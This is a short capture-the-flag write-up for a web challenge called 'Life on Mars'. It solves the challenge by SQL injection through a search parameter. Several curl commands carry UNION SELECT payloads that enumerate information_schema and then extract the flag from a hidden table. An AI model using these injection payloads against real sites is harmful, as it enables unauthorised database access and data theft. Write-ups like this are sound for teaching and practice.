# Life on Mars
- This challenge is a basic site that queries a database to display information about the various species of life on Mars.
- We have the `/query` route and can use that to make arbitrary db calls

## SQL injection
- We can use the search= query string to send our injection
### To get the databases:
```bash
$ curl "web.ctf.b01lers.com:1001/query?search=hellas_basin%20UNION%20SELECT%20666,%20table_schema%20FROM%20information_schema.tables;%20--%20-"

["666","information_schema"],["666","alien_code"],["666","aliens"]]
```
### To get the table_names
```bash
$ curl "web.ctf.b01lers.com:1001/query?search=hellas_basin%20UNION%20SELECT%20666,table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20NOT%20LIKE%20'information_schema';--%20-"
[...snip..., ["666","code"],["666","amazonis_planitia"],["666","arabia_terra"],["666","chryse_planitia"],["666","hellas_basin"],["666","hesperia_planum"],["666","noachis_terra"],["666","olympus_mons"],["666","tharsis_rise"],["666","utopia_basin"]]
```
- The 'code' table is not given, so lets see if its part of the `alien_code` database

### To get columns in code table
```bash
$ curl "web.ctf.b01lers.com:1001/query?search=hesperia_planum%20UNION%20SELECT%20666,%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name='code';--%20-"
[...snip...,["666","id"],["666","code"]]
```


### To get the flag:
- Trying a valid query to alien\_code.code
```bash
$ curl "web.ctf.b01lers.com:1001/query?search=utopia_basin%20UNION%20SELECT%20id,%20code%20FROM%20alien_code.code;%20--%20-
[...snip...,["0","pctf{no_intelligent_life_here}"]]
```

# Flag
- pctf{no_intelligent_life_here}
